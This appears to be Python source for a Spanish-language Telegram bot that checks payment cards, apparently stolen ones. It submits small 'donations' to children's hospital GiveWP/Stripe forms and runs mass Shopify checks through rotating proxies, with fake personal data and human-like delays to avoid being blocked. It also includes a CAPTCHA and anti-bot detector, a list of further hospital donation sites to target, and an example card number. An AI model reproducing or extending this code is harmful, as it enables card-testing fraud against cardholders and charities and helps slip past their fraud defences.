            "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        ]
        logger.info(f"🛡️ Inicializando AntiBlockHandler - {len(proxies)} proxies disponibles")
        
    def _parse_cookies(self, cookie_string: str) -> Dict:
        cookies = {}
        for cookie in cookie_string.split('; '):
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key] = value
        return cookies
    
    def _get_next_proxy(self) -> Optional[str]:
        """Obtiene el siguiente proxy en rotación"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        
        # Formatear proxy para aiohttp
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            return f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
        elif len(proxy_parts) == 3 and proxy_parts[2] == '':
            return f"http://{proxy_parts[0]}:{proxy_parts[1]}"
        elif len(proxy_parts) == 2:
            return f"http://{proxy}"
        else:
            return None
    
    def _get_random_user_agent(self) -> str:
        """Obtiene un User-Agent aleatorio"""
        return random.choice(self.user_agents)
    
    async def get_session(self) -> aiohttp.ClientSession:
        """Obtiene sesión con proxy y headers rotados"""
        timeout = aiohttp.ClientTimeout(total=60)
        
        # 🔥 SOLUCIÓN CLAVE: Eliminar 'br' del Accept-Encoding
        headers = {
            'User-Agent': self._get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',  # ← ELIMINADO 'br' (Brotli)
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        
        connector = aiohttp.TCPConnector(ssl=False)
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            headers=headers,
            cookies=self.cookies,
            connector=connector
        )
        return self.session
    
    async def _random_delay(self, min_seconds: float = 2.0, max_seconds: float = 5.0):
        """Pausa aleatoria para simular comportamiento humano"""
        delay = random.uniform(min_seconds, max_seconds)
        logger.info(f"⏱️ Pausa de {delay:.1f}s")
        await asyncio.sleep(delay)
    
    def generate_fake_personal_data(self) -> Dict:
        """Genera datos personales falsos (variados)"""
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Joseph", "Thomas", "Charles", "Christopher", "Daniel", "Matthew", "Anthony", "Donald", "Mark", "Paul", "Steven", "Andrew", "Kenneth", "Joshua"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
        
        # Múltiples direcciones de Perth
        addresses = [
            {"address": "771 Albany Highway", "suburb": "East Victoria Park", "postcode": "6101"},
            {"address": "789 Albany Highway", "suburb": "East Victoria Park", "postcode": "6101"},
            {"address": "45 Duncan Street", "suburb": "Victoria Park", "postcode": "6100"},
            {"address": "12 Swansea Street", "suburb": "East Victoria Park", "postcode": "6101"},
            {"address": "33 Shepperton Road", "suburb": "Victoria Park", "postcode": "6100"},
            {"address": "28 Oats Street", "suburb": "East Victoria Park", "postcode": "6101"},
            {"address": "15 Kent Street", "suburb": "Victoria Park", "postcode": "6100"},
            {"address": "7 Mint Street", "suburb": "East Victoria Park", "postcode": "6101"},
            {"address": "52 Hill View Terrace", "suburb": "East Victoria Park", "postcode": "6101"},
            {"address": "83 Basinghall Street", "suburb": "East Victoria Park", "postcode": "6101"},
        ]
        
        addr = random.choice(addresses)
        
        # Generar email con dominio variado
        domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "protonmail.com", "mail.com"]
        
        # Teléfonos australianos variados
        prefixes = ["04", "041", "042", "043", "044", "045", "046", "047", "048", "049"]
        
        data = {
            "first_name": random.choice(first_names),
            "last_name": random.choice(last_names),
            "email": f"{random.choice(first_names).lower()}.{random.choice(last_names).lower()}{random.randint(1,9999)}@{random.choice(domains)}",
            "phone": f"{random.choice(prefixes)}{random.randint(100,999)}{random.randint(100,999)}",
            "address": addr["address"],
            "suburb": addr["suburb"],
            "postcode": addr["postcode"],
            "state": "Western Australia",
            "country": "Australia"
        }
        
        logger.info(f"👤 Datos generados: {data['first_name']} {data['last_name']}, {data['email']}")
        return data
    
    async def complete_donation(self, amount: float, card_data: Dict) -> JobResult:
        """Ejecuta el flujo completo con rotación de IP y User-Agent"""
        logger.info(f"🎯 Iniciando donación anti-bloqueo: ${amount}")
        
        # Rotar proxy
        proxy_url = self._get_next_proxy()
        proxy_display = "sin proxy"
        if proxy_url:
            proxy_display = proxy_url.split('@')[0].replace('http://', '') if '@' in proxy_url else proxy_url
            logger.info(f"🔄 Usando proxy: {proxy_display}")
        
        session = await self.get_session()
        start_time = time.time()
        
        try:
            # Paso 1: Visitar página principal con delay inicial
            await self._random_delay(1, 3)
            logger.info("📡 Paso 1: Visitando página principal")
            
            if proxy_url:
                async with session.get(self.base_url, proxy=proxy_url, ssl=False) as resp:
                    html = await resp.text()
                    logger.info(f"✅ Página principal cargada - Status: {resp.status}, Tamaño: {len(html)} bytes")
            else:
                async with session.get(self.base_url) as resp:
                    html = await resp.text()
                    logger.info(f"✅ Página principal cargada - Status: {resp.status}, Tamaño: {len(html)} bytes")
            
            # Guardar cookies actualizadas
            self.cookies.update(session.cookie_jar.filter_cookies(self.base_url))
            
            await self._random_delay(2, 4)
            
            # Paso 2: Establecer cantidad
            logger.info(f"💰 Paso 2: Estableciendo cantidad ${amount}")
            amount_data = {
                "give-form-id": "1",
                "give-amount": f"{amount:.2f}",
            }
            
            if proxy_url:
                async with session.post(f"{self.base_url}/", data=amount_data, proxy=proxy_url, ssl=False) as resp:
                    html2 = await resp.text()
                    logger.info(f"✅ Cantidad establecida - Status: {resp.status}")
            else:
                async with session.post(f"{self.base_url}/", data=amount_data) as resp:
                    html2 = await resp.text()
                    logger.info(f"✅ Cantidad establecida - Status: {resp.status}")
            
            await self._random_delay(2, 4)
            
            # Paso 3: Generar y enviar datos personales
            logger.info("📝 Paso 3: Enviando datos personales")
            personal = self.generate_fake_personal_data()
            self.personal_data = personal
            
            personal_data = {
                "give_first": personal["first_name"],
                "give_last": personal["last_name"],
                "give_email": personal["email"],
                "give_phone": personal["phone"],
            }
            
            if proxy_url:
                async with session.post(f"{self.base_url}/", data=personal_data, proxy=proxy_url, ssl=False) as resp:
                    html3 = await resp.text()
                    logger.info(f"✅ Datos personales enviados - Status: {resp.status}")
            else:
                async with session.post(f"{self.base_url}/", data=personal_data) as resp:
                    html3 = await resp.text()
                    logger.info(f"✅ Datos personales enviados - Status: {resp.status}")
            
            await self._random_delay(2, 4)
            
            # Paso 4: Enviar dirección
            logger.info("🏠 Paso 4: Enviando dirección")
            address_data = {
                "billing_address1": personal["address"],
                "billing_address2": "",
                "billing_city": personal["suburb"],
                "billing_postcode": personal["postcode"],
                "billing_state": personal["state"],
                "billing_country": personal["country"],
            }
            
            if proxy_url:
                async with session.post(f"{self.base_url}/", data=address_data, proxy=proxy_url, ssl=False) as resp:
                    html4 = await resp.text()
                    logger.info(f"✅ Dirección enviada - Status: {resp.status}")
            else:
                async with session.post(f"{self.base_url}/", data=address_data) as resp:
                    html4 = await resp.text()
                    logger.info(f"✅ Dirección enviada - Status: {resp.status}")
            
            await self._random_delay(2, 4)
            
            # Paso 5: Ir a página de pago
            logger.info("💳 Paso 5: Accediendo a página de pago")
            payment_url = f"{self.base_url}/payment"
            
            if proxy_url:
                async with session.get(payment_url, proxy=proxy_url, ssl=False) as resp:
                    payment_html = await resp.text()
                    logger.info(f"✅ Página de pago cargada - Status: {resp.status}, Tamaño: {len(payment_html)} bytes")
            else:
                async with session.get(payment_url) as resp:
                    payment_html = await resp.text()
                    logger.info(f"✅ Página de pago cargada - Status: {resp.status}, Tamaño: {len(payment_html)} bytes")
            
            # Buscar indicadores de Stripe
            if "stripe" in payment_html.lower():
                logger.info("💳 Stripe detectado en la página")
            if "card" in payment_html.lower():
                logger.info("💳 Formulario de tarjeta detectado")
            
            await self._random_delay(3, 6)
            
            # Paso 6: Enviar datos de tarjeta
            logger.info("💳 Paso 6: Enviando datos de tarjeta")
            cardholder = f"{personal['first_name']} {personal['last_name']}"
            payment_data = {
                "cardholder_name": cardholder,
                "card_number": card_data['number'],
                "card_expiry": f"{card_data['month']}/{card_data['year'][-2:]}",
                "card_cvc": card_data['cvv'],
            }
            
            logger.debug(f"Datos de pago: {cardholder}, tarjeta: {card_data['number'][:6]}xxxxxx{card_data['number'][-4:]}")
            
            if proxy_url:
                async with session.post(payment_url, data=payment_data, proxy=proxy_url, ssl=False, allow_redirects=True) as pay_resp:
                    elapsed = time.time() - start_time
                    final_text = await pay_resp.text()
                    logger.info(f"✅ Pago procesado - Status: {pay_resp.status}, Tiempo: {elapsed:.2f}s")
            else:
                async with session.post(payment_url, data=payment_data, allow_redirects=True) as pay_resp:
                    elapsed = time.time() - start_time
                    final_text = await pay_resp.text()
                    logger.info(f"✅ Pago procesado - Status: {pay_resp.status}, Tiempo: {elapsed:.2f}s")
            
            logger.info(f"📄 Respuesta (primeros 200 chars): {final_text[:200]}")
            
            # Clasificar resultado
            status, confidence, reason, patterns = ResponseClassifier.classify(final_text, pay_resp.status, elapsed)
            
            # Extraer precio
            price = f"${amount:.2f}"
            
            logger.info(f"📊 Resultado clasificado: {status.value} - {reason}")
            
            return JobResult(
                job=Job(
                    site=self.base_url,
                    proxy=proxy_display,
                    card_data=card_data,
                    job_id=0
                ),
                status=status,
                confidence=confidence,
                reason=reason,
                response_time=elapsed,
                http_code=pay_resp.status,
                response_text=final_text[:500],
                success=(status == CheckStatus.CHARGED),
                bin_info=await get_bin_info(card_data['bin']),
                price=price,
                patterns_detected=patterns
            )
                
        except asyncio.TimeoutError:
            elapsed = time.time() - start_time
            logger.error(f"⏱️ TIMEOUT después de {elapsed:.2f}s")
            return JobResult(
                job=Job(
                    site=self.base_url,
                    proxy=proxy_display if proxy_url else "",
                    card_data=card_data,
                    job_id=0
                ),
                status=CheckStatus.READ_TIMEOUT,
                confidence=Confidence.MEDIUM,
                reason="donation_timeout",
                response_time=elapsed,
                http_code=None,
                response_text="",
                success=False,
                bin_info=await get_bin_info(card_data['bin']),
                price=f"${amount:.2f}"
            )
            
        except Exception as e:
            elapsed = time.time() - start_time
            logger.error(f"💥 Error en donación: {str(e)}", exc_info=True)
            return JobResult(
                job=Job(
                    site=self.base_url,
                    proxy=proxy_display if proxy_url else "",
                    card_data=card_data,
                    job_id=0
                ),
                status=CheckStatus.UNKNOWN,
                confidence=Confidence.LOW,
                reason=f"error: {str(e)[:50]}",
                response_time=elapsed,
                http_code=None,
                response_text="",
                success=False,
                bin_info=await get_bin_info(card_data['bin']),
                price=f"${amount:.2f}"
            )
    
    async def close(self):
        """Cierra la sesión"""
        if self.session and not self.session.closed:
            await self.session.close()

# ================== PROXY HEALTH CHECKER ==================
class ProxyHealthChecker:
    def __init__(self, db: Database, user_id: int):
        self.db = db
        self.user_id = user_id
        self.test_url = "https://httpbin.org/ip"
        self.timeout = aiohttp.ClientTimeout(
            total=None,
            connect=10,
            sock_read=20
        )
        
    async def check_proxy(self, proxy: str) -> Dict:
        start_time = time.time()
        result = {
            "proxy": proxy,
            "alive": False,
            "response_time": 0,
            "error": None,
            "ip": None,
        }
        
        try:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            elif len(proxy_parts) == 3 and proxy_parts[2] == '':
                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
            else:
                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
            
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                async with session.get(self.test_url, proxy=proxy_url) as resp:
                    if resp.status == 200:
                        elapsed = time.time() - start_time
                        result["alive"] = True
                        result["response_time"] = elapsed
                        try:
                            data = await resp.json()
                            result["ip"] = data.get("origin", "Unknown")
                        except:
                            pass
        except Exception as e:
            result["error"] = str(e)[:50]
        
        return result
    
    async def check_all_proxies(self, proxies: List[str], max_concurrent: int = 25) -> List[Dict]:
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def check_with_semaphore(proxy):
            async with semaphore:
                return await self.check_proxy(proxy)
        
        tasks = [check_with_semaphore(p) for p in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        final_results = []
        for i, res in enumerate(results):
            if isinstance(res, Exception):
                final_results.append({
                    "proxy": proxies[i],
                    "alive": False,
                    "response_time": 0,
                    "error": str(res),
                    "ip": None
                })
            else:
                final_results.append(res)
        
        return final_results

# ================== EJECUTOR DE JOBS SHOPIFY ==================
class ShopifyJobExecutor:
    @staticmethod
    async def execute(job: Job, session: aiohttp.ClientSession) -> JobResult:
        card_data = job.card_data
        card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
        params = {"site": job.site, "cc": card_str, "proxy": job.proxy}
        
        start_time = time.time()
        bin_info = await get_bin_info(card_data['bin'])
        
        try:
            api_endpoint = random.choice(Settings.API_ENDPOINTS)
            
            # Configurar proxy
            proxy_parts = job.proxy.split(':')
            if len(proxy_parts) == 4:
                proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            elif len(proxy_parts) == 3 and proxy_parts[2] == '':
                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
            elif len(proxy_parts) == 2:
                proxy_url = f"http://{job.proxy}"
            else:
                proxy_url = None
            
            try:
                if proxy_url:
                    async with session.get(api_endpoint, params=params, proxy=proxy_url) as resp:
                        elapsed = time.time() - start_time
                        try:
                            response_text = await asyncio.wait_for(resp.text(), timeout=60)
                        except asyncio.TimeoutError:
                            response_text = ""
                else:
                    async with session.get(api_endpoint, params=params) as resp:
                        elapsed = time.time() - start_time
                        try:
                            response_text = await asyncio.wait_for(resp.text(), timeout=60)
                        except asyncio.TimeoutError:
                            response_text = ""
                            
            except asyncio.TimeoutError:
                elapsed = time.time() - start_time
                if elapsed < 10:
                    return JobResult(
                        job=job,
                        status=CheckStatus.CONNECT_TIMEOUT,
                        confidence=Confidence.CONFIRMED,
                        reason="proxy_failed",
                        response_time=elapsed,
                        http_code=None,
                        response_text="",
                        success=False,
                        bin_info=bin_info,
                        price="N/A"
                    )
                else:
                    return JobResult(
                        job=job,
                        status=CheckStatus.READ_TIMEOUT,
                        confidence=Confidence.CONFIRMED,
                        reason="slow_response",
                        response_time=elapsed,
                        http_code=None,
                        response_text="",
                        success=False,
                        bin_info=bin_info,
                        price="N/A"
                    )
            
            status, confidence, reason, patterns = ResponseClassifier.classify(response_text, resp.status, elapsed)
            price = extract_price(response_text)
            
            return JobResult(
                job=job,
                status=status,
                confidence=confidence,
                reason=reason,
                response_time=elapsed,
                http_code=resp.status,
                response_text=response_text[:500],
                success=(status == CheckStatus.CHARGED),
                bin_info=bin_info,
                price=price,
                patterns_detected=patterns
            )
            
        except Exception as e:
            elapsed = time.time() - start_time
            return JobResult(
                job=job,
                status=CheckStatus.UNKNOWN,
                confidence=Confidence.LOW,
                reason=f"error: {str(e)[:50]}",
                response_time=elapsed,
                http_code=None,
                response_text="",
                success=False,
                bin_info=bin_info,
                price="N/A"
            )

# ================== USER MANAGER ==================
class UserManager:
    def __init__(self, db: Database):
        self.db = db
        self._rate_lock = asyncio.Lock()

    async def get_user_data(self, user_id: int) -> Dict:
        row = await self.db.fetch_one(
            "SELECT sites, proxies, cards, givewp_sites FROM users WHERE user_id = ?",
            (user_id,)
        )
        
        if not row:
            await self.db.execute(
                "INSERT INTO users (user_id, sites, proxies, cards, givewp_sites) VALUES (?, ?, ?, ?, ?)",
                (user_id, '[]', '[]', '[]', '[]')
            )
            return {"sites": [], "proxies": [], "cards": [], "givewp_sites": []}
        
        return {
            "sites": json.loads(row["sites"]),
            "proxies": json.loads(row["proxies"]),
            "cards": json.loads(row["cards"]),
            "givewp_sites": json.loads(row["givewp_sites"]) if row["givewp_sites"] else []
        }

    async def update_user_data(self, user_id: int, **kwargs):
        current = await self.get_user_data(user_id)
        
        for key, value in kwargs.items():
            if value is not None:
                current[key] = value
        
        await self.db.execute(
            """UPDATE users SET 
               sites = ?, proxies = ?, cards = ?, givewp_sites = ?
               WHERE user_id = ?""",
            (json.dumps(current["sites"]), json.dumps(current["proxies"]), 
             json.dumps(current["cards"]), json.dumps(current["givewp_sites"]), user_id)
        )

    async def check_rate_limit(self, user_id: int, command: str) -> Tuple[bool, str]:
        async with self._rate_lock:
            today = datetime.now().date()
            
            row = await self.db.fetch_one(
                "SELECT * FROM rate_limits WHERE user_id = ?",
                (user_id,)
            )
            
            if not row:
                await self.db.execute(
                    """INSERT INTO rate_limits 
                       (user_id, last_check, checks_today, last_mass, mass_count_hour, last_reset)
                       VALUES (?, ?, ?, ?, ?, ?)""",
                    (user_id, datetime.now(), 0, None, 0, today)
                )
                return True, ""
            
            last_reset = datetime.fromisoformat(row["last_reset"]).date()
            if last_reset < today:
                await self.db.execute(
                    "UPDATE rate_limits SET checks_today = 0, mass_count_hour = 0, last_reset = ? WHERE user_id = ?",
                    (today, user_id)
                )
                checks_today = 0
                mass_count_hour = 0
            else:
                checks_today = row["checks_today"]
                mass_count_hour = row["mass_count_hour"]
            
            if command == "mass":
                if mass_count_hour >= Settings.MASS_LIMIT_PER_HOUR:
                    return False, f"⚠️ Máximo {Settings.MASS_LIMIT_PER_HOUR} mass/hora"
            
            elif command == "check":
                if checks_today >= Settings.DAILY_LIMIT_CHECKS:
                    return False, f"📅 Límite diario ({Settings.DAILY_LIMIT_CHECKS}) alcanzado"
                
                if row.get("last_check"):
                    last_check = datetime.fromisoformat(row["last_check"])
                    elapsed = (datetime.now() - last_check).seconds
                    if elapsed < Settings.RATE_LIMIT_SECONDS:
                        wait = Settings.RATE_LIMIT_SECONDS - elapsed
                        return False, f"⏳ Espera {wait}s"
            
            return True, ""

    async def increment_checks(self, user_id: int, command: str):
        now = datetime.now()
        
        if command == "mass":
            await self.db.execute(
                """UPDATE rate_limits SET 
                   mass_count_hour = mass_count_hour + 1,
                   last_mass = ?
                   WHERE user_id = ?""",
                (now, user_id)
            )
        else:
            await self.db.execute(
                """UPDATE rate_limits SET 
                   checks_today = checks_today + 1,
                   last_check = ?
                   WHERE user_id = ?""",
                (now, user_id)
            )

# ================== CARD CHECK SERVICE ==================
class CardCheckService:
    def __init__(self, db: Database, user_manager: UserManager):
        self.db = db
        self.user_manager = user_manager

    async def check_shopify(self, user_id: int, card_data: Dict, site: str, proxy: str) -> JobResult:
        timeout = aiohttp.ClientTimeout(
            total=None,
            connect=10,
            sock_read=60
        )
        
        job = Job(
            site=site,
            proxy=proxy,
            card_data=card_data,
            job_id=0
        )
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            result = await ShopifyJobExecutor.execute(job, session)
        
        await self.db.save_result(user_id, result, "shopify")
        
        return result

    async def donate_givewp_anti_block(self, user_id: int, card_data: Dict, amount: float = 5.00) -> JobResult:
        """Verifica una donación en GiveWP con sistema anti-bloqueo"""
        logger.info(f"🚀 Iniciando donación anti-bloqueo para tarjeta {card_data['bin']}xxxxxx{card_data['last4']}, monto ${amount}")
        
        # Obtener proxies del usuario
        user_data = await self.user_manager.get_user_data(user_id)
        proxies = user_data.get("proxies", [])
        
        if not proxies:
            logger.warning("⚠️ No hay proxies disponibles, se usará conexión directa")
        
        start_time = time.time()
        
        handler = AntiBlockGiveWPDonationHandler(user_id, proxies, Settings.GIVEWP_SESSION_COOKIE)
        try:
            logger.info("⏳ Ejecutando complete_donation anti-bloqueo...")
            result = await handler.complete_donation(amount, card_data)
            
            elapsed = time.time() - start_time
            logger.info(f"✅ Donación completada en {elapsed:.2f}s - Status: {result.status.value}")
            
            await self.db.save_result(user_id, result, "givewp")
            return result
            
        except asyncio.TimeoutError:
            elapsed = time.time() - start_time
            logger.error(f"⏱️ TIMEOUT en donación después de {elapsed:.2f}s")
            return JobResult(
                job=Job(
                    site=handler.base_url,
                    proxy="",
                    card_data=card_data,
                    job_id=0
                ),
                status=CheckStatus.READ_TIMEOUT,
                confidence=Confidence.MEDIUM,
                reason="donation_timeout",
                response_time=elapsed,
                http_code=None,
                response_text="",
                success=False,
                bin_info=await get_bin_info(card_data['bin']),
                price=f"${amount:.2f}"
            )
            
        except Exception as e:
            elapsed = time.time() - start_time
            logger.error(f"💥 Error en donación: {str(e)}", exc_info=True)
            return JobResult(
                job=Job(
                    site=handler.base_url,
                    proxy="",
                    card_data=card_data,
                    job_id=0
                ),
                status=CheckStatus.UNKNOWN,
                confidence=Confidence.LOW,
                reason=f"error: {str(e)[:50]}",
                response_time=elapsed,
                http_code=None,
                response_text="",
                success=False,
                bin_info=await get_bin_info(card_data['bin']),
                price=f"${amount:.2f}"
            )
        finally:
            await handler.close()

# ================== NUEVOS COMANDOS DE ANÁLISIS ==================
async def analyze_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Analiza un sitio web en busca de CAPTCHA"""
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text(
            "❌ Uso: /analyze <url>\n"
            "Ejemplo: /analyze https://donate.schf.org.au"
        )
        return
    
    url = context.args[0]
    
    msg = await update.message.reply_text(f"🔍 Analizando {url}...")
    
    result = await CaptchaDetector.check_site(url)
    
    if not result['success']:
        await msg.edit_text(f"❌ Error: {result.get('error', 'Desconocido')}")
        return
    
    # Formatear resultado
    response = []
    response.append(f"🔍 *ANÁLISIS DE SITIO*\n━━━━━━━━━━━━━━━━━━\n")
    response.append(f"📍 URL: `{result['url']}`")
    response.append(f"📊 Status: {result['status_code']} ({result['response_time']:.2f}s)")
    
    # Resultado de CAPTCHA
    captcha = result['captcha']
    if captcha['has_captcha']:
        response.append(f"\n🚫 *CAPTCHA DETECTADO*")
        for ct in captcha['detected_types']:
            service = captcha['details'].get(ct, {}).get('service', 'Desconocido')
            response.append(f"• {service}")
        response.append(f"\n🎯 Confianza: {captcha['confidence']}")
    else:
        response.append(f"\n✅ *NO SE DETECTARON CAPTCHAS*")
    
    # Headers de seguridad
    headers = result['security_headers']
    if headers['has_security_headers']:
        response.append(f"\n🛡️ *PROTECCIÓN DETECTADA*")
        if headers['cloudflare']:
            response.append(f"• Cloudflare")
        if headers['datadome']:
            response.append(f"• DataDome")
        if headers['akamai']:
            response.append(f"• Akamai")
    
    # Recomendación
    response.append(f"\n💡 *RECOMENDACIÓN*")
    response.append(f"{result['recommendation']}")
    
    # Servicios de resolución (debug)
    if result['resolution_services']:
        response.append(f"\n🔧 *Servicios de resolución detectados*")
        for svc in result['resolution_services']:
            response.append(f"• {svc}")
    
    await msg.edit_text("\n".join(response), parse_mode="Markdown")

async def find_similar_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Busca sitios similares al actual (hospitales infantiles)"""
    
    # Lista de sitios de hospitales infantiles (basado en búsqueda)
    hospitals = [
        {
            'name': 'Royal Children\'s Hospital Foundation (Australia)',
            'url': 'https://www.rchfoundation.org.au',
            'note': 'Mismo país que el actual, probablemente sin captcha'
        },
        {
            'name': 'St. Jude Children\'s Research Hospital (EE.UU.)',
            'url': 'https://www.stjude.org/donate',
            'note': 'Sistema propio de donaciones'
        },
        {
            'name': 'BC Children\'s Hospital Foundation (Canadá)',
            'url': 'https://secure.bcchf.ca/donate',
            'note': 'Sistema canadiense de donaciones'
        },
        {
            'name': 'Texas Children\'s Hospital',
            'url': 'https://www.texaschildrens.org/support',
            'note': 'Sistema propio'
        },
        {
            'name': 'Children\'s Minnesota',
            'url': 'https://www.childrensmn.org/support-childrens',
            'note': 'Sistema de salud sin fines de lucro'
        },
        {
            'name': 'Alberta Children\'s Hospital Foundation',
            'url': 'https://www.childrenshospital.ab.ca/ways-to-help/donate',
            'note': 'Aceptan donaciones internacionales'
        },
        {
            'name': 'Sydney Children\'s Hospital (actual)',
            'url': 'https://donate.schf.org.au',
            'note': 'El que ya funciona'
        }
    ]
    
    response = []
    response.append("🏥 *HOSPITALES INFANTILES PARA PROBAR*\n")
    response.append("Estos sitios son similares al que ya usas:\n")
    
    for i, hospital in enumerate(hospitals, 1):
        response.append(f"{i}. *{hospital['name']}*")
        response.append(f"   🔗 {hospital['url']}")
        response.append(f"   💡 {hospital['note']}")
        response.append("")
    
    response.append("Usa `/analyze <url>` para verificar si tienen CAPTCHA")
    
    await update.message.reply_text("\n".join(response), parse_mode="Markdown")

# ================== VARIABLES GLOBALES ==================
db = None
user_manager = None
card_service = None
cancel_mass = {}
user_state = {}
active_mass = set()

# ================== MENÚ PRINCIPAL ==================
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit: bool = False):
    text = (
        "🤖 *SHOPIFY + GIVEWP CHECKER*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Elige una opción:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💳 CHECK SHOPIFY", callback_data="menu_check")],
        [InlineKeyboardButton("📦 MASS CHECK", callback_data="menu_mass")],
        [InlineKeyboardButton("❤️ DONATE GIVEWP", callback_data="menu_donate")],
        [InlineKeyboardButton("🌐 SITES", callback_data="menu_sites")],
        [InlineKeyboardButton("🔌 PROXIES", callback_data="menu_proxies")],
        [InlineKeyboardButton("🧾 CARDS", callback_data="menu_cards")],
        [InlineKeyboardButton("📊 STATS", callback_data="menu_stats")],
        [InlineKeyboardButton("⚙️ SETTINGS", callback_data="menu_settings")],
        [InlineKeyboardButton("🔍 ANALYZER", callback_data="menu_analyzer")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if edit:
        await update.callback_query.edit_message_text(
            text, parse_mode="Markdown", reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)

# ================== SUBMENÚ ANALYZER ==================
async def show_analyzer_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🔍 *HERRAMIENTA DE ANÁLISIS*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Analiza sitios web para detectar CAPTCHA:\n\n"
        "• `/analyze <url>` - Analizar un sitio específico\n"
        "• `/findsites` - Ver sitios recomendados\n\n"
        "Ejemplo:\n"
        "`/analyze https://donate.schf.org.au`"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ DONATE ==================
async def show_donate_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "❤️ *DONACIONES GIVEWP*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Sydney Children's Hospital Foundation\n"
        "Donaciones con tarjeta vía Stripe\n\n"
        "Comandos rápidos:\n"
        "/donate5  - Donar $5\n"
        "/donate10 - Donar $10\n"
        "/donate20 - Donar $20\n"
        "/donate [monto] [nro_tarjeta] - Cantidad personalizada\n\n"
        "💡 *Nuevo:* Sistema anti-bloqueo con proxies rotativos"
    )
    
    keyboard = [
        [InlineKeyboardButton("💳 DONAR $5", callback_data="donate_5")],
        [InlineKeyboardButton("💳 DONAR $10", callback_data="donate_10")],
        [InlineKeyboardButton("💳 DONAR $20", callback_data="donate_20")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ CHECK CARD ==================
async def show_check_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💳 *CHECK SHOPIFY*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "Envía una tarjeta en formato:\n"
        "`NUMBER|MES|AÑO|CVV`\n\n"
        "Ejemplo:\n"
        "`4377110010309114|08|2026|501`"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ MASS CHECK ==================
async def show_mass_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    
    cards_count = len(user_data["cards"])
    sites_count = len(user_data["sites"])
    proxies_count = len(user_data["proxies"])
    
    text = (
        "📦 *MASS CHECK SHOPIFY*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"• Cards: {cards_count}\n"
        f"• Sites: {sites_count}\n"
        f"• Proxies: {proxies_count}\n\n"
        "Usa /mass para iniciar"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        text, parse_mode="Markdown", reply_markup=reply_markup
    )

# ================== SUBMENÚ SITES ==================
async def show_sites_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    sites = user_data["sites"]
    
    text = (
        "🌐 *SITES MANAGER*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"Total sites: `{len(sites)}`\n\n"
        "Envía URLs para agregar"
